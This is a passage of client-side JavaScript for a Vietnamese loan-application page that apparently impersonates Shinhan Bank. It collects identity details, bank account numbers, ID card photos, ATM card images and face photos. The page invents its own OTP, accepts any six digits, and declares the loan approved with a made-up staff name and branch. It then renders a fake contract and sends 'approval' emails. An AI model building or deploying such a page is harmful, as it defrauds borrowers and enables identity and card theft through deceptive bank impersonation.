            } catch (error) {
                console.error(`Lỗi chuyển từ bước ${currentStep} sang ${nextStep}:`, error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
            }
        }

        // Khôi phục dữ liệu từ localStorage
        window.onload = function() {
            try {
                const savedData = localStorage.getItem('userData');
                if (savedData) {
                    userData = JSON.parse(savedData);
                    if (userData.isRegistered && userData.loanCode) {
                        showToast("Hồ sơ đã có trên hệ thống. Vui lòng quay lại!", false);
                        $('#registerForm button[type="button"]').prop('disabled', true);
                        if (userData.currentStep >= 10) {
                            proceedToStep(1, 10, 100);
                        } else if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    } else {
                        $('#fullName').val(userData.fullName || '');
                        $('#idNumber').val(userData.idNumber || '');
                        $('#idIssueDate').val(userData.idIssueDate || '');
                        $('#idIssuePlace').val(userData.idIssuePlace || '');
                        $('#address').val(userData.address || '');
                        $('#occupation').val(userData.occupation || '');
                        $('#income').val(userData.income ? Number(userData.income).toLocaleString('vi-VN') : '');
                        $('#phoneNumber').val(userData.phoneNumber || '');
                        $('#email').val(userData.email || '');
                        $('#loanAmount').val(userData.loanAmount || '');
                        $('#loanTerm').val(userData.loanTerm || '');
                        $('#loanPurpose').val(userData.loanPurpose || '');
                        $('#accountNumber').val(userData.accountNumber || '');
                        $('#bankName').val(userData.bankName || '');
                        $('#termsAgree').prop('checked', userData.termsAgree || false);
                        if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    }
                    updatePreviewSection();
                }
            } catch (error) {
                console.error("Lỗi khôi phục localStorage:", error);
                showToast("Không thể khôi phục dữ liệu. Vui lòng bắt đầu lại.", false);
                userData = {};
                saveToLocalStorage(1);
                updatePreviewSection();
            }
        };

        // Hàm làm sạch dữ liệu
        function sanitizeInput(value) {
            if (!value) return "Không Cung Cấp";
            return String(value)
                .normalize("NFD")
                .replace(/[\u0300-\u036f]/g, "")
                .replace(/[^a-zA-Z0-9_]/g, "_")
                .replace(/\s+/g, "_");
        }

        // Hàm định dạng số tiền
        function formatNumber(number) {
            try {
                if (!number || isNaN(number)) return "0";
                return parseInt(number).toLocaleString('vi-VN', { minimumFractionDigits: 0 });
            } catch (error) {
                console.error("Lỗi định dạng số tiền:", error);
                return "0";
            }
        }

        // Hàm tạo mã hợp đồng
        function generateContractId() {
            try {
                const date = new Date();
                const randomNum = Math.floor(100000 + Math.random() * 900000);
                return `SHB-${date.getFullYear()}${(date.getMonth() + 1).toString().padStart(2, '0')}-${randomNum}`;
            } catch (error) {
                console.error("Lỗi tạo mã hợp đồng:", error);
                return "SHB-DEFAULT-000000";
            }
        }

        // Hàm tạo mã ngẫu nhiên
        function generateRandomCode() {
            try {
                return Math.floor(100000 + Math.random() * 900000).toString();
            } catch (error) {
                console.error("Lỗi tạo mã ngẫu nhiên:", error);
                return "000000";
            }
        }

        // Hàm lấy ngày hiện tại
        function getCurrentDate() {
            try {
                const date = new Date();
                return `${date.getDate().toString().padStart(2, '0')}/${(date.getMonth() + 1).toString().padStart(2, '0')}/${date.getFullYear()}`;
            } catch (error) {
                console.error("Lỗi lấy ngày hiện tại:", error);
                return "01/01/2025";
            }
        }

        // Hàm tính lãi suất dựa trên số tiền vay
        function calculateInterestRate(loanAmount) {
            try {
                const amount = parseInt(loanAmount);
                if (amount <= 50000000) return "12%";
                if (amount <= 200000000) return "11%";
                return "10%";
            } catch (error) {
                console.error("Lỗi tính lãi suất:", error);
                return "12%";
            }
        }

        // Hàm tính số tiền góp hàng tháng
        function calculateMonthlyPayment(loanAmount, loanTerm) {
            try {
                const monthlyInterestRate = 0.01;
                const totalInterest = loanAmount * monthlyInterestRate * loanTerm;
                const totalAmount = parseInt(loanAmount) + totalInterest;
                const monthlyPayment = totalAmount / loanTerm;
                return Math.round(monthlyPayment).toLocaleString('vi-VN');
            } catch (error) {
                console.error("Lỗi tính toán khoản góp:", error);
                return "0";
            }
        }

        // Hiển thị thông tin tệp đã tải lên
        $('#idFrontImage').on('change', function(e) {
            try {
                const file = e.target.files[0];
                if (file) {
                    $('#idFrontInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        userData.idFrontImageUrl = e.target.result;
                        updatePreviewSection();
                    };
                    reader.readAsDataURL(file);
                }
            } catch (error) {
                console.error("Lỗi xử lý idFrontImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#idBackImage').on('change', function(e) {
            try {
                const file = e.target.files[0];
                if (file) {
                    $('#idBackInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        userData.idBackImageUrl = e.target.result;
                        updatePreviewSection();
                    };
                    reader.readAsDataURL(file);
                }
            } catch (error) {
                console.error("Lỗi xử lý idBackImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#atmImage').on('change', function(e) {
            try {
                const file = e.target.files[0];
                if (file) {
                    $('#atmImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        userData.atmImageUrl = e.target.result;
                        updatePreviewSection();
                    };
                    reader.readAsDataURL(file);
                }
            } catch (error) {
                console.error("Lỗi xử lý atmImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#faceImage').on('change', function(e) {
            try {
                const file = e.target.files[0];
                if (file) {
                    $('#faceImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        userData.faceImageUrl = e.target.result;
                        updatePreviewSection();
                        saveToLocalStorage(userData.currentStep || 4);
                    };
                    reader.readAsDataURL(file);
                }
            } catch (error) {
                console.error("Lỗi xử lý faceImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        // Hàm tạo mã hồ sơ ngẫu nhiên
        function generateLoanCode() {
            try {
                const date = new Date();
                const year = date.getFullYear();
                const month = String(date.getMonth() + 1).padStart(2, '0');
                const day = String(date.getDate()).padStart(2, '0');
                const random = Math.floor(100000 + Math.random() * 900000);
                return `SHB-${year}${month}${day}-${random}`;
            } catch (error) {
                console.error("Lỗi tạo mã hồ sơ:", error);
                return "SHB-DEFAULT-000000";
            }
        }

        // Format thu nhập với dấu phẩy
        $('#income').on('input', function() {
            try {
                let value = $(this).val().replace(/[^0-9]/g, '');
                if (value) {
                    value = parseInt(value).toLocaleString('vi-VN');
                    $(this).val(value);
                }
            } catch (error) {
                console.error("Lỗi format thu nhập:", error);
            }
        });

        // Bước 1: Đăng ký hồ sơ
        $('#proceedToStep2Btn').on('click', function(e) {
            try {
                e.preventDefault();
                const requiredFields = ['fullName', 'idNumber', 'phoneNumber', 'email', 'loanAmount', 'loanTerm'];
                let allFilled = true;

                requiredFields.forEach(field => {
                    const value = $(`#${field}`).val();
                    if (!value) {
                        allFilled = false;
                        $(`#${field}`).addClass('is-invalid');
                    } else {
                        $(`#${field}`).removeClass('is-invalid');
                    }
                });

                if (!allFilled) {
                    showToast("Vui lòng điền đầy đủ các trường bắt buộc!", false);
                    $('#registerForm').addClass('was-validated');
                    return;
                }

                if (!$('#termsAgree').is(':checked')) {
                    showToast("Vui lòng đồng ý với các điều khoản!", false);
                    return;
                }

                let income = $('#income').val().replace(/[^0-9]/g, '') || '0';
                userData = {
                    fullName: $('#fullName').val(),
                    idNumber: $('#idNumber').val(),
                    idIssueDate: $('#idIssueDate').val() || 'Không Cung Cấp',
                    idIssuePlace: $('#idIssuePlace').val() || 'Không Cung Cấp',
                    address: $('#address').val() || 'Không Cung Cấp',
                    occupation: $('#occupation').val() || 'Không Cung Cấp',
                    income: income,
                    phoneNumber: $('#phoneNumber').val(),
                    email: $('#email').val(),
                    loanAmount: $('#loanAmount').val(),
                    loanTerm: $('#loanTerm').val(),
                    loanPurpose: $('#loanPurpose').val() || 'Không Cung Cấp',
                    accountNumber: $('#accountNumber').val() || 'Không Cung Cấp',
                    bankName: $('#bankName').val() || 'Không Cung Cấp',
                    termsAgree: $('#termsAgree').is(':checked'),
                    loanCode: generateLoanCode(),
                    registrationDate: getCurrentDate(),
                    monthlyPayment: calculateMonthlyPayment($('#loanAmount').val(), $('#loanTerm').val()),
                    interestRate: calculateInterestRate($('#loanAmount').val()),
                    sellerCode: generateRandomCode(),
                    storeCode: generateRandomCode(),
                    staffCode: generateRandomCode(),
                    staffName: "Nguyễn Thị Mỹ Duyên",
                    branchName: "Chi nhánh Shinhanbank Đà Nẵng",
                    isRegistered: true
                };

                proceedToStep(1, 2, 20);
            } catch (error) {
                console.error("Lỗi bước 1:", error);
                showToast("Lỗi xử lý hồ sơ. Vui lòng thử lại!", false);
            }
        });

        // Bước 2: Tải lên giấy tờ
        $('#proceedToStep3Btn').on('click', function() {
            try {
                const idFrontImage = $('#idFrontImage')[0].files[0];
                const idBackImage = $('#idBackImage')[0].files[0];
                if (!idFrontImage || !idBackImage) {
                    showToast("Vui lòng tải lên cả hai hình ảnh!", false);
                    if (!idFrontImage) $('#idFrontImage').addClass('is-invalid');
                    if (!idBackImage) $('#idBackImage').addClass('is-invalid');
                    return;
                }
                $('#idFrontImage').removeClass('is-invalid');
                $('#idBackImage').removeClass('is-invalid');
                userData.idFrontImage = idFrontImage;
                userData.idBackImage = idBackImage;
                proceedToStep(2, 3, 30);
            } catch (error) {
                console.error("Lỗi bước 2:", error);
                showToast("Lỗi tải lên giấy tờ. Vui lòng thử lại!", false);
            }
        });

        // Bước 3: Tải lên thẻ ATM
        $('#proceedToStep4Btn').on('click', function() {
            try {
                const atmImage = $('#atmImage')[0].files[0];
                if (!atmImage) {
                    showToast("Vui lòng tải lên hình ảnh thẻ ATM!", false);
                    $('#atmImage').addClass('is-invalid');
                    return;
                }
                $('#atmImage').removeClass('is-invalid');
                userData.atmImage = atmImage;
                proceedToStep(3, 4, 40);
            } catch (error) {
                console.error("Lỗi bước 3:", error);
                showToast("Lỗi tải lên thẻ ATM. Vui lòng thử lại!", false);
            }
        });

        // Bước 4: Chụp khuôn mặt
        $('#proceedToOtpBtn').on('change', function() {
            try {
                const faceImage = $('#faceImage')[0].files[0];
                if (!faceImage) {
                    showToast("Vui lòng tải lên hình ảnh khuôn mặt!", false);
                    $('#faceImage').addClass('is-invalid');
                    return;
                }
                $('#faceImage').removeClass('is-invalid');
                userData.faceImage = faceImage;
                const reader = new FileReader();
                reader.onload = function(e) {
                    userData.faceImageUrl = e.target.result;
                    updatePreviewSection();
                    saveToLocalStorage(4);
                };
                reader.readAsDataURL(faceImage);
                proceedToStep(4, 5, 50);
                const otp = Math.floor(100000 + Math.random() * 900000);
                $('#otpDisplay').text(otp);
                userData.otp = otp.toString();
                saveToLocalStorage(5);
            } catch (error) {
                console.error("Lỗi bước 4:", error);
                showToast("Lỗi xử lý ảnh khuôn mặt. Vui lòng thử lại!", false);
            }
        });

        // Xử lý nhập OTP
        $('.otp-digit').on('input', function(e) {
            try {
                const $this = $(this);
                const value = $this.val();
                if (value.length === 1 && $this.next('.otp-digit').length) {
                    $this.next('.otp-digit').focus();
                } else if (value.length === 0 && $this.prev('.otp-digit').length) {
                    $this.prev('.otp-digit').focus();
                }
            } catch (error) {
                console.error("Lỗi xử lý nhập OTP:", error);
            }
        });

        // Hàm sao chép mã OTP
        function copyOtp() {
            try {
                const otp = $('#otpDisplay').text();
                navigator.clipboard.writeText(otp).then(() => {
                    showToast("Đã sao chép mã OTP!", true);
                }).catch(() => {
                    showToast("Lỗi khi sao chép mã OTP!", false);
                });
            } catch (error) {
                console.error("Lỗi sao chép OTP:", error);
                showToast("Lỗi khi sao chép mã OTP!", false);
            }
        }

        // Hàm sao chép mã OTP ký hợp đồng
        function copySignOtp() {
            try {
                const signOtp = $('#signOtpDisplay').text();
                navigator.clipboard.writeText(signOtp).then(() => {
                    showToast("Đã sao chép mã OTP!", true);
                }).catch(() => {
                    showToast("Lỗi khi sao chép mã OTP!", false);
                });
            } catch (error) {
                console.error("Lỗi sao chép OTP ký hợp đồng:", error);
                showToast("Lỗi khi sao chép mã OTP!", false);
            }
        }

        // Hàm kiểm tra dữ liệu email
        function validateEmailParams(params) {
            try {
                for (let key in params) {
                    if (params[key] === undefined || params[key] === null) {
                        params[key] = "Không Cung Cấp";
                    }
                }
                return params;
            } catch (error) {
                console.error("Lỗi validate email params:", error);
                return params;
            }
        }

        // Hàm gửi email
        async function sendEmail(serviceId, templateId, params) {
            try {
                const response = await emailjs.send(serviceId, templateId, params);
                showToast("Email đã được gửi!", true);
                return response;
            } catch (error) {
                console.error("Lỗi gửi email:", error);
                showToast("Không thể gửi email. Vui lòng liên hệ hỗ trợ!", false);
                return null;
            }
        }

        // Bước 5: Xác minh OTP
        $('#verifyOtpBtn').on('click', function() {
            try {
                const otpInput = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
                if (otpInput.length !== 6) {
                    showToast("Vui lòng nhập đủ 6 chữ số OTP!", false);
                    $('.otp-digit').addClass('is-invalid');
                    return;
                }
                $('.otp-digit').removeClass('is-invalid');
                proceedToStep(5, 6, 60);
                setTimeout(() => {
                    showSuccessModal();
                }, 3000);
            } catch (error) {
                console.error("Lỗi xác minh OTP:", error);
                showToast("Lỗi xác minh OTP. Vui lòng thử lại!", false);
            }
        });

        // Hàm hiển thị modal chúc mừng
        function showSuccessModal() {
            try {
                $('#modalFullName').text(`Họ và tên: ${userData.fullName || 'Không Cung Cấp'}`);
                $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
                $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode || 'Không Cung Cấp'}`);
                const modal = new bootstrap.Modal(document.getElementById('successModal'));
                modal.show();

                // Gửi email thông báo duyệt
                const emailParams = validateEmailParams({
                    to_email: userData.email,
                    full_name: userData.fullName,
                    loan_amount: formatNumber(userData.loanAmount) + ' VND',
                    loan_code: userData.loanCode,
                    registration_date: userData.registrationDate
                });
                sendEmail('service_4r7mlsc', 'template_approval', emailParams);
            } catch (error) {
                console.error("Lỗi hiển thị modal thành công:", error);
                showToast("Lỗi hiển thị thông báo duyệt. Vui lòng thử lại!", false);
            }
        }

        // Chuyển sang bước hợp đồng
        function proceedToContract() {
            try {
                proceedToStep(6, 7, 70);
                $('#confirmationMessage').text(`Hồ sơ vay tín chấp của bạn đã được duyệt với mã hồ sơ: ${userData.loanCode}`);
                $('#confirmationEmail').text(userData.email);
            } catch (error) {
                console.error("Lỗi chuyển sang bước hợp đồng:", error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
            }
        }

        // Bước 7: Xem hợp đồng
        $('#proceedToContractBtn').on('click', function() {
            try {
                proceedToStep(7, 8, 80);
                renderCanvas('contractCanvas', formData.contractImage, userData);
            } catch (error) {
                console.error("Lỗi bước 7:", error);
                showToast("Lỗi hiển thị hợp đồng. Vui lòng thử lại!", false);
            }
        });

        // Bước 8: Chuyển sang ký hợp đồng
        $('#proceedToSignContractBtn').on('click', function() {
            try {
                proceedToStep(8, '8-1', 85);
                const signOtp = Math.floor(100000 + Math.random() * 900000);
                $('#signOtpDisplay').text(signOtp);
                userData.signOtp = signOtp.toString();
                saveToLocalStorage('8-1');
            } catch (error) {
                console.error("Lỗi bước 8:", error);
                showToast("Lỗi chuyển sang ký hợp đồng. Vui lòng thử lại!", false);
            }
        });

        // Bước 8.1: Xác minh OTP ký hợp đồng
        $('#verifySignOtpBtn').on('click', function() {
            try {
                const signOtpInput = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
                if (signOtpInput.length !== 6) {
                    showToast("Vui lòng nhập đủ 6 chữ số OTP!", false);
                    $('.otp-digit').addClass('is-invalid');
                    return;
                }
                $('.otp-digit').removeClass('is-invalid');
                proceedToStep('8-1', 9, 90);
                renderCanvas('disbursementCanvas', formData.disbursementImage, userData);

                // Gửi email thông báo điều kiện giải ngân
                const emailParams = validateEmailParams({
                    to_email: userData.email,
                    full_name: userData.fullName,
                    loan_amount: formatNumber(userData.loanAmount) + ' VND',
                    loan_code: userData.loanCode,
                    account_number: userData.accountNumber || 'Không Cung Cấp',
                    bank_name: userData.bankName || 'Không Cung Cấp'
                });
                sendEmail('service_4r7mlsc', 'template_disbursement', emailParams);
            } catch (error) {
                console.error("Lỗi xác minh OTP ký hợp đồng:", error);
                showToast("Lỗi xác minh OTP. Vui lòng thử lại!", false);
            }
        });

        // Bước 9: Hoàn tất
        $('#proceedToFinalStepBtn').on('click', function() {
            try {
                proceedToStep(9, 10, 100);
            } catch (error) {
                console.error("Lỗi bước 9:", error);
                showToast("Lỗi chuyển sang bước hoàn tất. Vui lòng thử lại!", false);
            }
        });

        // Các nút "Quay lại"
        $('#backToStep1Btn').on('click', function() {
            proceedToStep(2, 1, 10);
        });
        $('#backToStep2Btn').on('click', function() {
            proceedToStep(3, 2, 20);
        });
        $('#backToStep3Btn').on('click', function() {
            proceedToStep(4, 3, 30);
        });
        $('#backToStep4Btn').on('click', function() {
            proceedToStep(5, 4, 40);
        });
        $('#backToStep5Btn').on('click', function() {
            proceedToStep(6, 5, 50);
        });
        $('#backToStep6Btn').on('click', function() {
            proceedToStep(7, 6, 60);
        });
        $('#backToStep7Btn').on('click', function() {
            proceedToStep(8, 7, 70);
        });
        $('#backToStep8Btn').on('click', function() {
            proceedToStep('8-1', 8, 80);
        });
        $('#backToStep8-1Btn').on('click', function() {
            proceedToStep(9, '8-1', 85);
        });
        $('#backToStep9Btn').on('click', function() {
            proceedToStep(10, 9, 90);
        });

        // Hàm hiển thị canvas với thông tin người dùng
        function renderCanvas(canvasId, imageUrl, userData) {
            try {
                const canvas = document.getElementById(canvasId);
                const ctx = canvas.getContext('2d');
                const img = new Image();
                img.crossOrigin = "Anonymous";
                img.src = imageUrl;

                img.onload = function() {
                    canvas.width = 720;
                    canvas.height = 1018;
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);

                    ctx.font = '24px Roboto';
                    ctx.fillStyle = '#000000';
                    ctx.textAlign = 'left';

                    const startX = 60;
                    const baseY = 80;
                    const lineHeight = 40;
                    const checkmark = '\u2713';

                    if (canvasId === 'contractCanvas') {
                        ctx.fillText('Ngày nộp hồ sơ: ' + (userData.registrationDate || 'Không Cung Cấp'), startX, baseY);
                        ctx.fillText('Họ và tên (như trên CMND): ' + (userData.fullName || 'Không Cung Cấp'), startX, baseY + lineHeight);
                        ctx.fillText('Số CMND/CCCD: ' + (userData.idNumber || 'Không Cung Cấp'), startX, baseY + 2 * lineHeight);
                        ctx.fillText('Số điện thoại: ' + (userData.phoneNumber || 'Không Cung Cấp'), startX, baseY + 3 * lineHeight);
                        ctx.fillText('Email: ' + (userData.email || 'Không Cung Cấp'), startX, baseY + 4 * lineHeight);
                        ctx.fillText('Số tiền yêu cầu: ' + formatNumber(userData.loanAmount) + ' VND', startX, baseY + 5 * lineHeight);
                        const purpose = userData.loanPurpose || 'Vay tiêu dùng';
                        const purposeY = baseY + 6 * lineHeight;
                        ctx.fillText('Sửa chữa nhà', startX, purposeY);
                        ctx.fillText('Mua xe', startX + 180, purposeY);
                        ctx.fillText('Học tập', startX + 360, purposeY);
                        if (purpose === 'Sửa chữa nhà') ctx.fillText(checkmark, startX - 20, purposeY);
                        if (purpose === 'Mua xe') ctx.fillText(checkmark, startX + 160, purposeY);
                        if (purpose === 'Học tập') ctx.fillText(checkmark, startX + 340, purposeY);
                        if (!['Sửa chữa nhà', 'Mua xe', 'Học tập'].includes(purpose)) {
                            ctx.fillText('Khác: ' + purpose, startX, baseY + 7 * lineHeight);
                        }
                        const term = userData.loanTerm || '12';
                        const termY = baseY + 8 * lineHeight;
                        ctx.fillText('12 tháng', startX, termY);
                        ctx.fillText('24 tháng', startX + 120, termY);
                        ctx.fillText('36 tháng', startX + 240, termY);
                        if (term=== '12') ctx.fillText(checkmark, startX - 20, termY);
                        if (term === '24') ctx.fillText(checkmark, startX + 100, termY);
                        if (term === '36') ctx.fillText(checkmark, startX + 220, termY);
                        ctx.fillText('Mã hợp đồng: ' + (userData.loanCode || 'Không Cung Cấp'), startX, baseY + 9 * lineHeight);
                        ctx.fillText('Lãi suất: ' + (userData.interestRate || '12%'), startX, baseY + 10 * lineHeight);
                        ctx.fillText('Số tiền góp hàng tháng: ' + (userData.monthlyPayment || '0') + ' VND', startX, baseY + 11 * lineHeight);

                        // Lưu ảnh hợp đồng vào userData
                        userData.contractImageUrl = canvas.toDataURL('image/png');
                        updatePreviewSection();
                        saveToLocalStorage(userData.currentStep);
                    } else if (canvasId === 'disbursementCanvas') {
                        // Kiểm tra thông tin bắt buộc
                        const requiredFields = ['fullName', 'idNumber', 'loanAmount', 'accountNumber', 'bankName'];
                        let allFilled = true;
                        requiredFields.forEach(field => {
                            if (!userData[field]) {
                                allFilled = false;
                                console.warn(`Thiếu trường ${field}`);
                            }
                        });
                        if (!allFilled) {
                            showToast("Thiếu thông tin bắt buộc cho điều kiện giải ngân!", false);
                            return;
                        }

                        ctx.fillText('Mã hợp đồng: ' + (userData.loanCode || 'Không Cung Cấp'), startX, baseY);
                        ctx.fillText('Họ và tên: ' + (userData.fullName || 'Không Cung Cấp'), startX, baseY + lineHeight);
                        ctx.fillText('Số CMND/CCCD: ' + (userData.idNumber || 'Không Cung Cấp'), startX, baseY + 2 * lineHeight);
                        ctx.fillText('Số tiền vay: ' + formatNumber(userData.loanAmount) + ' VND', startX, baseY + 3 * lineHeight);
                        ctx.fillText('Số tài khoản: ' + (userData.accountNumber || 'Không Cung Cấp'), startX, baseY + 4 * lineHeight);
                        ctx.fillText('Ngân hàng nhận: ' + (userData.bankName || 'Không Cung Cấp'), startX, baseY + 5 * lineHeight);
                        ctx.fillText('Ngày giải ngân dự kiến: ' + getCurrentDate(), startX, baseY + 6 * lineHeight);
                        ctx.fillText('Nhân viên phụ trách: ' + (userData.staffName || 'Không Cung Cấp'), startX, baseY + 7 * lineHeight);
                        ctx.fillText('Chi nhánh: ' + (userData.branchName || 'Không Cung Cấp'), startX, baseY + 8 * lineHeight);

                        // Lưu ảnh điều kiện giải ngân vào userData
                        userData.disbursementImageUrl = canvas.toDataURL('image/png');
                        updatePreviewSection();
                        saveToLocalStorage(userData.currentStep);
                    }
                };

                img.onerror = function() {
                    console.error(`Không thể tải ảnh từ ${imageUrl}`);
                    img.src = formData.fallbackImage;
                    showToast("Không thể tải ảnh nền. Sử dụng ảnh mặc định!", false);
                };
            } catch (error) {
                console.error(`Lỗi hiển thị ${canvasId}:`, error);
                showToast(`Lỗi hiển thị ${canvasId === 'contractCanvas' ? 'hợp đồng' : 'điều kiện giải ngân'}. Vui lòng thử lại!`, false);
            }
        }

        // Khởi tạo canvas khi vào bước 8 và 9
        $(document).ready(function() {
            try {
                if (userData.currentStep === 8) {
                    renderCanvas('contractCanvas', formData.contractImage, userData);
                } else if (userData.currentStep === 9) {
                    renderCanvas('disbursementCanvas', formData.disbursementImage, userData);
                }
            } catch (error) {
                console.error("Lỗi khởi tạo canvas:", error);
                showToast("Lỗi khởi tạo canvas. Vui lòng thử lại!", false);
            }
        });

        // Xử lý sự kiện thay đổi file ảnh khuôn mặt để kích hoạt bước OTP
        $('#proceedToOtpBtn').off('click').on('click', function() {
            try {
                const faceImage = $('#faceImage')[0].files[0];
                if (!faceImage) {
                    showToast("Vui lòng tải lên hình ảnh khuôn mặt!", false);
                    $('#faceImage').addClass('is-invalid');
                    return;
                }
                $('#faceImage').removeClass('is-invalid');
                userData.faceImage = faceImage;
                const reader = new FileReader();
                reader.onload = function(e) {
                    userData.faceImageUrl = e.target.result;
                    updatePreviewSection();
                    saveToLocalStorage(4);
                    proceedToStep(4, 5, 50);
                    const otp = Math.floor(100000 + Math.random() * 900000);
                    $('#otpDisplay').text(otp);
                    userData.otp = otp.toString();
                    saveToLocalStorage(5);
                };
                reader.readAsDataURL(faceImage);
            } catch (error) {
                console.error("Lỗi xử lý ảnh khuôn mặt:", error);
                showToast("Lỗi xử lý ảnh khuôn mặt. Vui lòng thử lại!", false);
            }
        });

        // Hàm kiểm tra thông tin hợp lệ trước khi hiển thị canvas
        function validateCanvasData(userData, canvasId) {
            try {
                const requiredFields = canvasId === 'contractCanvas' 
                    ? ['fullName', 'idNumber', 'phoneNumber', 'email', 'loanAmount', 'loanTerm']
                    : ['fullName', 'idNumber', 'loanAmount', 'accountNumber', 'bankName'];
                return requiredFields.every(field => userData[field] && userData[field] !== 'Không Cung Cấp');
            } catch (error) {
                console.error("Lỗi kiểm tra dữ liệu canvas:", error);
                return false;
            }
        }

        // Xử lý lỗi mạng hoặc tải ảnh
        window.addEventListener('offline', function() {
            showToast("Mất kết nối mạng. Vui lòng kiểm tra lại!", false);
        });

        // Đảm bảo ảnh sắc nét trên màn hình retina
        function setCanvasResolution(canvas) {
            try {
                const ctx = canvas.getContext('2d');
                const dpr = window.devicePixelRatio || 1;
                canvas.width = 720 * dpr;
                canvas.height = 1018 * dpr;
                ctx.scale(dpr, dpr);
                canvas.style.width = '720px';
                canvas.style.height = '1018px';
            } catch (error) {
                console.error("Lỗi thiết lập độ phân giải canvas:", error);
            }
        }
    </script>
</body>
</html>
